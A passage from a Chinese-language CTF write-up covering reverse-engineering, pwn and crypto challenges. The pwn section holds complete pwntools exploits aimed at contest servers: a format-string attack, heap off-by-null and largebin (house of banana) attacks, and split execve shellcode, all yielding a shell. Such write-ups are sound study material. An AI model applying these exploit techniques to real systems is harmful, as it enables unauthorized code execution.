        {0x35, 0xba, 0x37, 0xc1, 0xe4, 0xc7, 0xf6, 0x13, 0x21, 0x18, 0x2f, 0xd8, 0xfe, 0x13, 0x27, 0x1f, 0xfc, 0xc7, 0xea, 0xb2, 0x3e, 0xbd, 0x2d, 0xd8, 0x90, 0x19, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25, },
        {0xe5, 0x8a, 0xe7, 0x91, 0xb4, 0x97, 0xc6, 0x13, 0xd1, 0x18, 0xdf, 0xa8, 0xce, 0x13, 0xd7, 0x1f, 0xcc, 0x97, 0xba, 0x82, 0xee, 0x8d, 0xdd, 0xa8, 0x60, 0x19, 0xd5, 0xd5, 0xd5, 0xd5, 0xd5, 0xd5, },
        {0xf5, 0x9a, 0xf7, 0xa1, 0xc4, 0xa7, 0xd6, 0x23, 0xe1, 0x28, 0xef, 0xb8, 0xde, 0x23, 0xe7, 0x2f, 0xdc, 0xa7, 0xca, 0x92, 0xfe, 0x9d, 0xed, 0xb8, 0x70, 0x29, 0xe5, 0xe5, 0xe5, 0xe5, 0xe5, 0xe5, },
};
int main() {
    printf("%s\n", first);
    int rands[] = {5, 5, 4, 4, 5, 4, 0, 0, 4, 2,5,5,1,3,1,5,1,2,3,0,3,0,2,3,4,4,3,2,2,5,5,0};
    unsigned char data2[33] = {
            0x57, 0xC5, 0x38, 0x1B, 0x3A, 0xA8, 0x34, 0x2F, 0x39, 0x97, 0xC6, 0xE4, 0x04, 0x2F, 0x8F, 0xEE,
            0x5E, 0x51, 0x80, 0x67, 0x24, 0xC9, 0x6F, 0x48, 0x5B, 0x7F, 0xBD, 0xC7, 0xB0, 0xC2, 0xC2, 0xEB, 0x0
    };
    for(int i = 31; i >= 0; i--) {
        unsigned char * data1 = &sec_key[i][0];
        switch (rands[i]) {
            case 0:
                for (int i = 0; i < 32; i++ )
                    data2[i] ^= data1[i];
                break;
            case 1:
                for(int i = 0; i < 32; i++) {
                    unsigned char n = (data1[i] >> 4) | (data1[i] << 4) ;
                    data2[i] ^= n;
                }
                break;
            case 2:
                for(int j = 0; j < 32; j++)
                    data2[j] ^= data1[j];
                break;
            case 3:
                for (int n = 0; n < 16; ++n) {
                    data2[n * 2] ^= data1[n * 2] << 4;
                    data2[n * 2 + 1] ^= data1[n * 2] >> 4;
                }
                break;
            case 4:
                for (int k = 0; k < 32; ++k)
                    data2[k] ^= data1[k];
                break;
            case 5:
                unsigned char tmp[32];
                memcpy(tmp,&sec_key[i - 1][0] , 32);
                for(int g = 0; g < 32; g++) {
                    u_char v5 = tmp[g];
                    u_char v8;
                    if ((unsigned char)(v5 - 33) > 0x2E) {
                        if ((unsigned char)(v5 - 81) > 0x2e) {
                            if(v5 > 128) {
                                v8 = v5 - 48;
                                data2[g] += v8;
                            }
                        } else {
                            v8 = v5 - 48;
                            data2[g] ^= (v8 >> 4);
                        };
                    } else {
                        v8 = v5 - 80;
                        data2[g] -= v8;
                    }
                }
        }

    }
    puts((char *)(data2));
    return 0;
}
```
其中 sec_key 的来源可以通过 idapythion 脚本获得
数据dump脚本如下
```
import binascii
def read_dbg_mem(addr, size):
    dd = []
    for i in range(size):
        dd.append(idc.read_dbg_byte(addr + i))
    return bytearray(dd)

def dump_data():
    rdi = idc.get_reg_value('rdi')
    data = read_dbg_mem(rdi, 0x40)
    key = ",".join([hex(i)[2:] for i in data[0:32]])
    data = ",".join([hex(i)[2:] for i in data[32:64]])
    print("key:", key)
    print("data:", data)
    print("")
    return False
```
dump_data 作为 ida 的断点脚本设置在如下位置即可
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_f488f43bb7f5af943b782defb579c6b6.png)
这样每一轮加密都会输出中间密钥（sec_key）与对应的密文数据方便调试。



### 勒索解密
简单爆破一下time(0)即可
```
#define  _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Crypt32.lib")
const char* pubkey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCJ7DFnM7uJiQYyozOgYTJs6oT9nRadxeyYux9/q/+hRcdKolSwRio0TOmpvmNrRttsyOPx01V8Cami2KonF2xqEzAg0OcDh6K1gzzBLxqI6XBipi4gJ/24OaXYFFr7CHCxBXeQDVjbPa53Kn2bOwknMT6+MuzNMoN4bFMa/p7QJQIDAQAB";
byte keyinfo[1000000] = { 0 };
byte keyinfo2[1000000] = { 0 };
void hexDump(void* data_ptr, size_t size)
{
    int i;
    size_t offset = 0;
    unsigned char* data = (unsigned char*)data_ptr;
    while (offset < size)
    {
        printf("%04x  ", offset);
        for (i = 0; i < 16; i++)
        {
            if (i % 8 == 0) putchar(' ');
            if (offset + i < size)
            {
                printf("%02x ", data[offset + i]);
            }
            else
            {
                printf("   ");
            }
        }
        printf("   ");
        for (i = 0; i < 16 && offset + i < size; i++)
        {
            if (isprint(data[offset + i]))
            {
                printf("%c", data[offset + i]);
            }
            else
            {
                putchar('.');
            }
        }
        putchar('\n');
        offset += 16;
    }
}

void decrypt_file(DWORD x) {
    HCRYPTPROV  ctx;
    HCRYPTHASH  ctx_has;
    HCRYPTKEY  aeskey;
    DWORD v8 = 16;
    DWORD TestData[500] = { 0x0EC62FB2, 0x4B54D44F, x, 0x8EB1E721 };

    FILE* fp = fopen("flag.bmp.ctf_crypter", "rb");
    size_t size = 0;
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    size_t size2 = (size - 0x84) / 16;
    
    char outname[256] = { 0 };
    sprintf(outname, "data%x.bmp", x);
    FILE* fp2 = fopen(outname, "wb");


    CryptAcquireContextA(&ctx, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18, 0xF0000000);

    CryptCreateHash(ctx, 0x800Cu, 0, 0, &ctx_has);
    CryptHashData(ctx_has, (const BYTE*)TestData, 16u, 0);

    CryptDeriveKey(ctx, 0x660Eu, ctx_has, 0, &aeskey);
    BYTE pbData[4] = { 1, 0, 0, 0 };
    BYTE v11[4] = { 1, 0, 0, 0 };
    CryptSetKeyParam(aeskey, 4u, pbData, 0);
    CryptSetKeyParam(aeskey, 3u, v11, 0);
    DWORD encLen = 16;

    
    for (int i = 0; i < size2; i++) {
        char buffer[32] = { 0 };
        fread(buffer, 16, 1, fp);
        CryptDecrypt(aeskey, 0, 0, 0, (BYTE*)buffer, &encLen);
        fwrite(buffer, 16, 1, fp2);
    }
    fclose(fp);
    fclose(fp2);
    CryptDestroyHash(ctx_has);
    CryptDestroyKey(aeskey);
    CryptReleaseContext(ctx, 0);
}

bool test(DWORD x) {
    DWORD bsize;
    DWORD datalen;
    HCRYPTPROV  ctx;
    HCRYPTHASH  ctx_has;
    HCRYPTKEY  aeskey;
    DWORD v8 = 16;
    DWORD TestData[500] = { 0x0EC62FB2, 0x4B54D44F, x, 0x8EB1E721 };
    unsigned char test[0x20] = { 0xB2, 0x02, 0xF8, 0x09, 0x6A, 0x8B, 0x3F, 0x25, 0x94, 0xED, 0xE7, 0xB1, 0xC9, 0xFC, 0x3A, 0xA7 };
   
    char test2[0x20] = "0123456789ABCDEF" ;
   // char test3[0x20] = { 0xDA, 0x3A, 0xFB, 0x16, 0x3E, 0x14, 0x87, 0xDE, 0xA6, 0xE6, 0xBA, 0xC1, 0x6D, 0xCD, 0x22, 0x05 };
    CryptAcquireContextA(&ctx, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18, 0xF0000000);

    CryptCreateHash(ctx, 0x800Cu, 0, 0, &ctx_has);
    CryptHashData(ctx_has, (const BYTE*)TestData, 16u, 0);

    CryptDeriveKey(ctx, 0x660Eu, ctx_has, 0, &aeskey);
    BYTE pbData[4] = { 1, 0, 0, 0 };
    BYTE v11[4] = { 1, 0, 0, 0 };
    CryptSetKeyParam(aeskey, 4u, pbData, 0);
    CryptSetKeyParam(aeskey, 3u, v11, 0);
    DWORD encLen = 16;

    CryptDecrypt(aeskey, 0, 1, 0, (BYTE*)test, &encLen);
    
    if (test[0] == 0x42 && test[1] == 0x4d) {
        hexDump(test, 16);
        decrypt_file(x);
        return true;
    }
    if (test[0] == 0x89 && test[1] == 0x50 && test[1] == 0x4e) {
        hexDump(test, 16);
        decrypt_file(x);
        return true;
    }
    if (test[0] == 0xFF && test[1] == 0xD8 && test[1] == 0xFF) {
        hexDump(test, 16);
        decrypt_file(x);
        return true;
    }
    CryptDestroyHash(ctx_has);
    CryptDestroyKey(aeskey);
    CryptReleaseContext(ctx, 0);
    
    return false;
}

int main() {
    test(0xaabbccdd);
    for (unsigned i = 0x61000000; i < 0x6120C4CD; i++) {
        if (test(i)) {
            printf("%x\n", i);
        }
    }
}
```


### Rev_Dizzy
IDA不能F5，所以把hexray.cfg配置文件里MAX_FUNCTION改大点，然后就OK了。

```c
// ...
arr[29] += arr[25];
  arr[22] -= arr[31];
  arr[21] -= 54;
  arr[0] += arr[5];
  arr[16] += arr[20];
  puts(byte_4361E6);
  *(_DWORD *)v6 = 0xFCE33C27;
  *(_DWORD *)&v6[4] = 0x5E07412E;
  *(_DWORD *)&v6[8] = 0xF2E8CF62;
  *(_DWORD *)&v6[12] = 0x36E28092;
  *(_DWORD *)&v6[16] = 0x7767B2B4;
  *(_DWORD *)&v6[20] = 0xB60DF60F;
  *(_DWORD *)&v6[24] = 0x8A651CED;
  *(_DWORD *)&v6[28] = 0x66A65307;
  for ( j = 0; j < 32 && v6[j] == arr[j]; ++j )
    ;
  if ( j == 32 )
    puts("You find flag");
  else
    puts("You don;t find it");
```

前面一大堆运算，一开始打算angr求解，但是写完跑起来半天没跑完，仔细观察下发现全是可逆的简单运算，于是写如下脚本先处理下：

```python
import re

with open('./main.c', 'r') as f:
    code = f.readlines()

wanted = []
for line in code:
    if 'arr[' not in line:
        continue
    if 'sub' in line:
        continue
    if 'for' in line:
        continue
    line = line.strip().replace(';', '') + '\n'
    if '+=' in line:
        line = line.replace('+=', '-=')
    elif '-=' in line:
        line = line.replace('-=', '+=')
    wanted.append(line)

wanted.reverse()

with open('./reverse.py', 'w') as f:
    f.writelines(wanted)
```

也就是获取每个计算式，然后加减反过来，异或的话就不用处理了，`a ^ b ^ b == a`。

最后将所有计算式反过来。

生成的reverse.py里就全是处理好的表达式了，然后加上头尾

```python
cmp = [0xFCE33C27, 0x5E07412E, 0xF2E8CF62, 0x36E28092, 0x7767B2B4, 0xB60DF60F, 0x8A651CED, 0x66A65307]
def dword_to_bytes(d):
    res = []
    for i in range(4):
        res.append(d & 0xff)
        d >>= 8
    return res
cmp_byte = []
for i in range(8):
    cmp_byte += dword_to_bytes(cmp[i])
print('cmp data: ', bytes(cmp_byte).hex())

import numpy as np
arr = np.array(cmp_byte, dtype='uint8')

# 
#	中间是前面的脚本生成的内容
#

print(bytes(arr.tolist()))
```

运行时会有Warning不过不用管，最后得到flag:

`flag{Try_R3vers1ng_W1th_ScR!pt!}`


### rua
这个文件是mac+arm环境才能运行
在苹果店偷偷开个ida server连自己的热点调试


先通过exit找到关键函数, 从异常字符串可以找到一个chacha加密
```
aInternalErrorE_0 DCB "internal error: entered unreachable code/private/tmp/rust-202106"
__const:000000010003FC60                                         ; DATA XREF: sub_100008F34+2F4↑o
__const:000000010003FC60                                         ; sub_100008F34+334↑o ...
__const:000000010003FC60                 DCB "18-40921-x2bdza/rustc-1.53.0-src/library/std/src/sync/mpsc/mod.r"
__const:000000010003FC60                 DCB "scalled `Option::unwrap()` on a `None` valueassertion failed: (*"
__const:000000010003FC60                 DCB "next).value.is_some()/private/tmp/rust-20210618-40921-x2bdza/rus"
__const:000000010003FC60                 DCB "tc-1.53.0-src/library/std/src/sync/mpsc/spsc_queue.rsassertion f"
__const:000000010003FC60                 DCB "ailed: (*n).value.is_none()called `Option::unwrap()` on a `None`"
__const:000000010003FC60                 DCB " value/Users/HAHAH/.cargo/registry/src/mirrors.ustc.edu.cn-61ef6"
__const:000000010003FC60                 DCB "e0cd06fb9b8/chacha20-0.7.2/src/chacha.rs",0
__const:000000010003FE49                 ALIGN 0x10
```
chacha 跟 Rc4 差不多，都是根据 key 生成流密钥，并把流密钥与明文进行异或。
我们可以控制加密，控制任意明文并得到对应的密文，那么只需要将明文与密文异或即可得到流密钥。
调试输入明文数据，得到一组密文数据

明文 ^ 密文 = 密钥

比较 ^ 密钥 = flag

流密钥如下
```
9f1f2462bffdc0e4e66a37a67ef2bf460f38cb17508d67f8148fe24b3ed12087d42842b8c0e1f6dff0ce
```
与目标密文异或得到flag


## pwn

### note
应该是scanf的格式化字符串漏洞, 无法泄漏, 但是可以依靠栈内的数据实现写入数据, 
存在一个stdout, 写入fake_stdout泄漏libc, 然后利用指向rbp的指针写入onegadget, 可以getshell, 
```python

from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000001235]

def show():
	sla("choice: ", '3')

def add(size, con):
	sla("choice: ", '1')
	sla("size: ", str(size))
	sla("content: ", con)

def say(fmt, con):
	sla("choice: ", '2')
	sla("say ? ", fmt)
	sla("? ", con)

def exp():
	say("%13$s\x00", flat(0x0FBAD1887, 0, 0, 0))
	file_jump = u64(ru(b"\x7f")[-6:].ljust(8,b"\x00"))
	libc_base = file_jump - 0x3c36e0
	print(hex(libc_base))
	onegadget =  libc_base + 0x45226
	say("%17$s\x00", flat(onegadget, onegadget))
	sl("cat flag")

context.os='linux'

context.log_level = 'debug'

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("47.104.70.90",25315)

elf = ELF('./bin')

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()
slog_show()
ia()

 

```

### PassWordBox_FreeVersion
在add的时候存在off by null, 
> 看起来像是off by one, 但是fget的参数2 len包含字符串最后的'\x00', 所以是off by nul, 

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_e931bbaa76658b98ce1f2e5b0ff08ac1.png)

然后, 2.27, off by null, 构造了个堆重合, 然后伪造tcache拿到free_hook, 写入system, 直接free掉一个写'/bin/sh\x00'的chunk即可, 
```python 
from pwn import * 

pie  = 1
arch = 64
bps  = [0x00000000000017B7, 0x0000000000018C6, 0x0000000000019F0]

def add(size, name='name', pwd='pwd\n'):
    sla("Choice:", "1")
    sla("Save:", name)
    sla("Pwd:", str(size))
    sa("Pwd:", pwd)

def show(idx):
    sla("Choice:", "3")
    sll(str(idx))

def edit(idx, pwd):
    sla("Choice:", "2")
    sl(str(idx))
    sl(pwd)

def dele(idx):
    sla("Choice:", "4")
    sla("Delete:", str(idx))

def exp():
    add(0x98, 'name',  'a' * 0x20+'\n')  # 0
    ru("First Add Done.Thx 4 Use. Save ID:")
    a = re(0x20, 2)
    xor = u64(a[:8]) ^ u64('a'*8)
    slog['xor'] = xor

    add(0x98) # 1
    add(0xf0) # 2
    # add(0x98, 'name', flat('a' * 0x90, (0xa0*2)^xor))

    for i in range(6):
        add(0x90) # 3

    for i in range(6):
        dele(3+i) # 3
    dele(1)

    for i in range(7):
        add(0xf0) # 3

    for i in range(6):
        dele(3+i)
    dele(1)

    dele(0)
    add(0x98, 'name', flat('a' * 0x90, (0xa0*2)^xor)) # 0
    dele(2)

    for i in range(6):
        add(0x90) # 1
    dele(0)

    add(0x80, 'name', '\n') # 0

    edit(0, 'a'*7+'\n')
    show(0)
    ru("Pwd is: ")
    re(8, 2)
    leak = u64(re(6, 2).ljust(8, b'\x00'))
    print("leak: " + hex(leak))
    slog['leak'] = leak
    if ((leak >> 40) != 0x7f):
        print("nop")
        exit(0)

    libc = (leak - 0x3eb000) & 0xfffffffffffff000
    slog['libc'] = libc
    system = libc + 0x4f550
    slog['system'] = system
    free_hook = libc + 0x3ed8e8
    slog['free_hook'] = free_hook

    add(0x70, 'name', flat(0^xor, 0xa0^xor, free_hook^xor, '\n')) # 7
    add(0x90, 'name', flat(u64('/bin/sh\x00')^xor, '\n')) # 8
    add(0x90, 'name', flat(system ^ xor, '\n')) # 9

    dele(8)
    sl('cat flag')



context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("47.104.71.220", 38562)

elf = ELF('./bin')

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
saa = lambda x    : cn.sendafter(':', x)
# after a, send b;

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()

slog_show()

ia()


```

### PassWordBox_ProVersion
菜单部分仍然用上个exp稍作修改, 
glibc 2.31, size要大于0x420, 
漏洞是可以重置flag位达到uaf效果, 
泄漏libc和heap比较简单,  然后只能使用largebin, 
配合`rtld_global`和exit函数可以伪造rtld_global结构体, 也就是使用house of bannana, 这里也选择这种做法, 
> 其实配合io的数据修改可以通过house of pig类似的思路利用, 应该也可以成功, 不过没尝试,
```python 
from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000001c20]

def add(idx,size, name='name', pwd='pwd\n'):
    sla("Choice:", "1")
    sla("Add:", str(idx))
    sla("Save:", name)
    sla("Pwd:", str(size))
    sa("Pwd:", pwd)

def show(idx):
    sla("Choice:", "3")
    sll(str(idx))

def edit(idx, pwd):
    sla("Choice:", "2")
    sll(str(idx))
    sd(pwd)

def dele(idx):
    sla("Choice:", "4")
    sla("Delete:", str(idx))

def reco(idx):
    sla("Choice:", "5")
    sla("Recover:", str(idx))

def exp():
    add(0,0x520, 'name',  'a' * 0x20+'\n')
    ru("First Add Done.Thx 4 Use. Save ID:")
    a = re(0x20, 2)
    xor = u64(a[:8]) ^ u64('a'*8)
    slog['xor'] = xor
    add(1,0x428, 'name',  'a' * 0x20+'\n') 
    add(2,0x500, 'name',  'a' * 0x20+'\n') 
    add(3,0x420, 'name',  'a' * 0x20+'\n')
    dele(0)
    add(4,0x600,'name','c'*0x600) #4
    add(5,0x600,'name','c'*0x600) #5
    reco(0)
    show(0)
    ru("Pwd is: ")
    leak = u64(re(8, 2)) ^ xor
    print("leak: " + hex(leak))
    slog['leak'] = leak
    if ((leak >> 40) != 0x7f):
        print("nop")
        exit(0)
    libc_base = (leak - 1168 - 0x10) - libc.sym["__malloc_hook"]
    slog['libc'] = libc_base
    system = libc_base + libc.sym['system']
    slog['system'] = system
    free_hook = libc_base + libc.sym['__free_hook']
    slog['free_hook'] = free_hook
    global_max_fast = libc_base + 0x1edb78
    rtl_global = libc_base + 2236512
    slog['rtl_global'] = rtl_global
    print(hex(rtl_global))
    set_context = libc_base + libc.sym['setcontext'] + 61
    ret = libc_base + libc.sym['setcontext'] + 351
    pop_rdi = libc_base + 0x00000000000276e9
    binsh_addr = libc_base + 0x00000000001b75aa
    system_addr =  libc_base + libc.sym['system']
    ogg = libc_base + 0xe6e79
    edit(0,'a'*0x10)
    show(0)
    ru("Pwd is: ")
    re(16,2)
    heap_addr = u64(re(8, 2)) ^ xor
    print("heapleak: " + hex(heap_addr))
    slog['heap'] = heap_addr
    edit(0,p64(leak)*2)
    #未归位的large bin
    dele(2)
    dele(4)
    #控制large bin的bk
    edit(0,p64(0) + p64(0) + p64(0) + p64(rtl_global - 0x20))
    #raw_input()
    slog_show()
    add(6,0x600,'name','large bin attack!!\n')
    reco(2)
    payload = p64(0) + p64(libc_base + 0x223740) + p64(0) + p64(heap_addr + 0x960)
    payload += p64(set_context) + p64(ret)

    payload += p64(binsh_addr)
    payload += p64(0)
    payload += p64(system_addr)
    payload += b'\x00'*0x80

    payload += p64(heap_addr + 0x960 + 0x28 + 0x18)

    payload += p64(pop_rdi)
    payload = payload.ljust(0x100,b'\x00')
    payload += p64(heap_addr + 0x960 + 0x10 + 0x110)*0x3
    payload += p64(0x10)
    payload = payload.ljust(0x31C - 0x10,b'\x00')
    payload += p8(0x8)
    payload = payload.ljust(0x500,b'\x00')
    edit(2,payload)
    edit(1,b'b'*0x420 + p64(heap_addr + 0x960 + 0x20))
    #gdba()
    sla("Choice:", "6")


context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    libc = ELF("./libc.so")
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("47.104.71.220", 49261)
    libc = ELF("./libc.so")

#elf = ELF('./bin')

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
saa = lambda x    : cn.sendafter(':', x)
# after a, send b;

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()

slog_show()

ia()
```

### JigSaw'sCage
scanf写入值的时候高位是`mprotect`的len参数, 于是可以修改整个heap权限为rwx, 然后每个heap只能写入0xf个, 把getshell的shellcode拆成几段, 然后配合`jmp $+..`跳到加一段, 拼接出来shellcode即可, 
```python
from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000001C41]

def name():
    sla("Name:", 'a')
    sla("Choice:", str(0x21000 << 8*4))

def add(idx):
    sla("Choice :", '1')
    sla("Index? :", str(idx))

def edit(idx, con):
    sla("Choice :", '2')
    sla("Index? :", str(idx))
    sa("iNput:", con)

def show(idx):
    sla("Choice :", '5')
    sla("Index? :", str(idx))

def dele(idx):
    sla("Choice :", '3')
    sla("Index? :", str(idx))

def test(idx):
    sla("Choice :", '4')
    sla("Index? :", str(idx))

def exp():
    name()
    for i in range(5):
        add(i)

    code = asm('''
    push 0x3b
    pop rax
    cltd
    jmp $+0x1c
    ''')
    edit(0, code)

    code = asm('''
    mov rbx, 0x68732f2f6e69622f
    push rdx
    push rbx
    push rsp
    jmp $+0x13
    ''')
    edit(1, code)


    code = asm('''
    pop rdi
    push rdx
    push rdi
    push rsp
    pop rsi
    syscall
    jmp $+0x10
    ''')
    edit(2, code)

    test(0)

context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("ip", port)

elf = ELF('./bin')


re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()
slog_show()
ia()
```

## crypto


### **Random_RSA**

把代码反过来写就完事了

但是要注意题目random.seed是在python2环境下算出的数据。。。。有点坑了



```python
from Crypto.Util.number import *
import random
seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]

res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]

ans = [] 
for i in range(0, 154):
    random.seed(seeds[i])
    rands = []
    for j in range(0,4):
        rands.append(random.randint(0,255))
    print(rands)
    ans.append(res[i] ^ rands[i%4])
print(ans)
# print(bytes(ans))
ans = [53, 51, 55, 50, 48, 48, 55, 52, 50, 54, 49, 54, 49, 49, 57, 54, 49, 53, 52, 52, 48, 53, 54, 52, 48, 53, 48, 52, 49, 49, 48, 55, 51, 54, 54, 53, 57, 49, 57, 48, 49, 56, 51, 49, 57, 52, 48, 53, 50, 57, 54, 54, 55, 50, 51, 48, 55, 54, 48, 52, 49, 50, 54, 54, 54, 49, 48, 56, 57, 51, 49, 53, 56, 54, 55, 56, 48, 57, 50, 56, 52, 53, 52, 53, 48, 50, 51, 50, 53, 48, 56, 55, 57, 51, 50, 55, 57, 53, 56, 53, 49, 54, 51, 51, 48, 52, 57, 49, 56, 56, 48, 55, 54, 53, 54, 57, 52, 54, 49, 52, 55, 53, 55, 53, 50, 56, 48, 48, 54, 51, 50, 48, 56, 49, 54, 56, 56, 49, 54, 52, 53, 55, 51, 52, 54, 55, 53, 53, 50, 50, 55, 48, 53, 55]
print(bytes(ans))
# 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057
```
然后常规解泄露dp

```python
e = 65537
n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113
dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657
c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751

import gmpy2
from Crypto.Util.number import *


dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057
e=0x10001
n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391
c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151

for i in range(1,65538):
    if (dp*e-1)%i == 0:
        if n%(((dp*e-1)//i)+1)==0:
            p=((dp*e-1)//i)+1
            q=n//(((dp*e-1)//i)+1)
            phi = (p-1)*(q-1)
            d = gmpy2.invert(e,phi)%phi
            print(long_to_bytes(pow(c,d,n)))

# flag{74281db3-c6f0-e59a-4da6-39b8c71250fe}
```

### guess

> 这个题妥妥的被找到非预期了。。。。

#### Analysis and implement

这个地方是非预期的核心这里会随机选取一个key附加上明文上

KEY比较特别的是，其中每个元素要么在KEY[R]上，要么在KEY[R+1]上，这是该非预期的基础

```python
            self._send("Give me m0.")
            plaintext1 = int(self._recv().decode())
            self._send("Give me m1.")
            plaintext2 = int(self._recv().decode())

            if (
                plaintext1 <= 2
                or plaintext2 <= 2
                or len(bin(plaintext1)) != len(bin(plaintext2))
            ):
                return
